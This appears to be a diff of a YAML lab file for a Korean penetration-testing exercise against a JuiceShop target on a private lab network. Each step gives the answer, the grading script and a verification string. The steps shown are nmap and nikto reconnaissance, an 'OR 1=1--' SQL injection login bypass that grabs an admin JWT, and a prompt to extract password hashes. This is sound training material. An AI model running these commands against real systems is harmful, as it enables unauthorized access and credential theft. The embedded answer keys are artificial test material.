@@ -17,14 +17,16 @@ steps:
   hint: nmap -sn으로 호스트 발견 후 -sV로 서비스 탐지를 수행한다
   category: recon
   points: 10
-  answer: sudo nmap -sn 10.20.30.0/24 && echo '===== Service Detection =====' && sudo nmap -sV -T4 -p- --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100
+  answer: sudo nmap -sn 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 && echo '===== Service Detection =====' && sudo nmap -sV -T4 --max-retries 1 --host-timeout 15s --top-ports 100 10.20.30.1 10.20.30.80
+    10.20.30.100
   answer_detail: 모의해킹의 첫 단계는 대상 범위(scope) 내 모든 자산을 식별하는 것이다. 호스트 발견 -> 포트 스캔 -> 서비스/버전 탐지 순서로 수행하며, 결과를 체계적으로 기록한다.
   verify:
     type: output_contains
     expect: Nmap scan report
     field: stdout
   target_vm: attacker
-  script: sudo nmap -sn 10.20.30.0/24 && echo '===== Service Detection =====' && sudo nmap -sV -T4 -p- --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100
+  script: sudo nmap -sn 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 && echo '===== Service Detection =====' && sudo nmap -sV -T4 --max-retries 1 --host-timeout 15s --top-ports 100 10.20.30.1 10.20.30.80
+    10.20.30.100
   risk_level: low
 - order: 2
   instruction: 'Phase 1 - 웹 정찰: JuiceShop(10.20.30.80:3000)의 기술 스택, API 엔드포인트, 공개 파일을 수집하라.'
@@ -47,30 +49,32 @@ steps:
   hint: nikto -h와 nmap --script vuln을 실행한다
   category: analysis
   points: 10
-  answer: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 2>/dev/null | head -30
+  answer: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 --max-retries 1 --host-timeout
+    15s -T4 2>/dev/null | head -30
   answer_detail: 자동화 스캐너의 결과는 시작점이며, 오탐(false positive)을 수동으로 검증해야 한다. 여러 도구의 결과를 교차 확인하면 탐지율을 높이고 오탐을 줄일 수 있다.
   verify:
     type: output_contains
     expect: Scan
     field: stdout
   target_vm: attacker
-  script: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 2>/dev/null | head -30
+  script: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60 2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p 3000 10.20.30.80 --max-retries 1 --host-timeout
+    15s -T4 2>/dev/null | head -30
   risk_level: low
 - order: 4
   instruction: 'Phase 3 - 초기 접근: SQL Injection을 사용하여 JuiceShop 관리자 계정으로 접근하라. JWT 토큰을 획득하라.'
   hint: 이전 week에서 배운 SQLi 기법을 적용한다
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && echo "Admin token acquired: ${TOKEN:0:50}..." && python3 -c "import base64,json; p=''$TOKEN''.split(''.'')[1]; p+=''=''*(-len(p)%4); d=json.loads(base64.urlsafe_b64decode(p)); print(f''User: {d.get(\"data\",{}).get(\"email\",\"unknown\")}'')"'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"\'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo "Admin token acquired: ${TOKEN:0:50}..."'
   answer_detail: SQL Injection을 통한 인증 우회는 웹 애플리케이션의 가장 위험한 취약점 중 하나이다. CVSS 9.8(Critical)에 해당하며, 데이터베이스 전체에 대한 접근이 가능할 수 있다.
   verify:
     type: output_contains
     expect: Admin token acquired
     field: stdout
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && echo "Admin token acquired: ${TOKEN:0:50}..." && python3 -c "import base64,json; p=''$TOKEN''.split(''.'')[1]; p+=''=''*(-len(p)%4); d=json.loads(base64.urlsafe_b64decode(p)); print(f''User: {d.get(\"data\",{}).get(\"email\",\"unknown\")}'')"'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"\'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo "Admin token acquired: ${TOKEN:0:50}..."'
   risk_level: medium
 - order: 5
   instruction: 'Phase 3 - 데이터 추출: UNION 기반 SQL Injection으로 데이터베이스의 사용자 정보(이메일, 비밀번호 해시)를 추출하라.'
